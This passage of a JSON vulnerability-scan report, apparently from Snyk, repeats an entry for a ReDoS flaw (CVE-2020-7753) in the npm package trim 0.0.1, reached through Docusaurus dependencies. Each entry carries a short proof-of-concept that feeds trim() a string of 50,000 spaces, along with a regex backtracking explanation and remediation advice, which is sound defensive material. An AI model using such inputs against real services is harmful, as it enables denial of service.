      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e 